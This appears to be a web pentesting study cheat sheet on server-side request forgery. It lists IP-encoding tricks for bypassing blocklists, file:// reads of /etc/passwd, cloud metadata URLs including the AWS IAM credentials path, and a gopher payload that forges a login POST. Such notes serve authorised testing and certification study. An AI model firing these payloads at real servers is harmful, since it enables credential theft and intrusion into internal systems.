---
category: OSWA Web App Pentesting
order: 3
summary: Bypassing URL filters and blocklists, cloud metadata endpoints, protocol smuggling via gopher, and SSRFmap usage.
---
# SSRF

## Discovery when the app shows you nothing
Point the vulnerable field at your own box and read the access log — reveals the exact path requested and the User-Agent (which fetcher it uses, and therefore which tricks apply):
```
sudo python3 -m http.server 80
```
Capture the real request from the UI with Burp rather than guessing internal routes.

## "Access denied" isn't always auth
```
http://127.0.0.1/protected-endpoint
http://localhost/protected-endpoint
```
Test whether it's just an IP-origin check before assuming credentials are needed.

## IP/hostname blocklist bypass
| Technique | Example |
|---|---|
| Decimal IP | `http://2130706433/` (= 127.0.0.1) |
| Octal IP | `http://0177.0.0.1/` |
| Hex IP | `http://0x7f000001/` |
| Shortened (drop the zeros) | `http://127.1/` |
| IPv6 loopback | `http://[::1]/` |
| IPv6-mapped IPv4 | `http://[::ffff:127.0.0.1]/` |
| `@` parser confusion | `http://expected.com@127.0.0.1/` |
| Open redirect | Host a URL that 302s to the real target |
| DNS rebinding | Own domain's A record pointed at an internal IP |

## `file://` — local file read
```
file:///etc/passwd
file:///app/config.ini
```
Only works if the fetcher supports non-http(s) schemes — `curl` does, Python's `requests` does not.

## Cloud metadata services
| Provider | URL | Required header |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | None (IMDSv1) |
| AWS IAM creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | None (IMDSv1) |
| GCP | `http://169.254.169.254/computeMetadata/v1/` | `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | None |

## `gopher://` — forge raw requests (POST, custom headers)
```
gopher://backend:80/_POST%20/login%20HTTP/1.1%0aHost:%20backend%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2029%0a%0ausername=admin%26password=admin
```
`%0a` = newline (need two in a row before the body), `%20` = space, `&` inside the body must be `%26`. If the app decodes the parameter twice, double the encoding (`%250a`, `%2520`).

## Troubleshooting gotchas
- An internal hostname won't resolve from your own attack box — only the vulnerable app can reach it. Fire it through the SSRF field, don't visit it directly.
- Desynced `Content-Length` in a gopher payload is the most common failure.
- "Denied"/"unauthorized" often means an IP-origin check, not real auth.
- Chain findings: a diagnostics endpoint unlocked via loopback can leak internal IPs/hostnames of other services.

## Reference links
- PayloadsAllTheThings — SSRF Bypass techniques
- HackTricks — SSRF
